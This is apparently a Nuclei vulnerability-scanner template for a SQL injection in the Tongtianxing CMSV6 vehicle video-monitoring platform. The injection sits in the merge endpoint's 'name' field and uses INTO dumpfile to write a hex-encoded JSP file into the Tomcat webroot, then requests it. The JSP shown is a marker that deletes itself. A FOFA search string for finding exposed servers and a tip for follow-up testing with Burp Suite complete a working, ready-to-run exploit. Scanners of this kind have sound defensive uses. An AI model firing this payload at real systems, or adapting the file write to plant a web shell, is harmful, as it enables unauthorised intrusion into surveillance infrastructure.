id: gsky-cmsv6-merge-sqli
info:
  name: 通天星 CMSV6 车载视频监控平台 merge - sqli
  author: leadlife
  severity: high
  description: 
  reference: 
    - https://github.com/wy876/POC/blob/main/%E9%80%9A%E5%A4%A9%E6%98%9FCMSV6%E6%8E%A5%E5%8F%A3pointManage%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5.md
  metadata:
    verified: true
    max-request: 1
    tips: 写进去的文件是存在的，可使用 burpsuite 二次测试
    fofa-query: body="./open/webApi.html"||body="/808gps/"
  tags: gsky,sqli,g-sky

variables:
  num: '{{rand_int(800000000, 1000000000)}}'

http:
  - raw:
      - |+
        POST /point_manage/merge HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.2882.93 Safari/537.36
        Content-Type: application/x-www-form-urlencoded

        id=1&name=1' UNION SELECT%0aNULL, 0x3c25206f75742e7072696e7428227a7a3031306622293b206e6577206a6176612e696f2e46696c65286170706c69636174696f6e2e6765745265616c5061746828726571756573742e676574536572766c657450617468282929292e64656c65746528293b20253e,NULL,NULL,NULL,NULL,NULL,NULL
        INTO dumpfile '../../tomcat/webapps/gpsweb/{{num}}.jsp' FROM user_session a
        WHERE '1 '='1 &type=3&map_id=4&install_place=5&check_item=6&create_time=7&update_time=8

      - |+
        GET /{{num}}.jsp HTTP/1.1
        Host: {{Hostname}}


    matchers:
      - type: dsl
        dsl:
          - "status_code_1 == 200 && status_code_2 == 200"
          - "contains(body_1, '服务器异常')"
          - "contains(body_2, 'zz010f')"
        condition: and

# 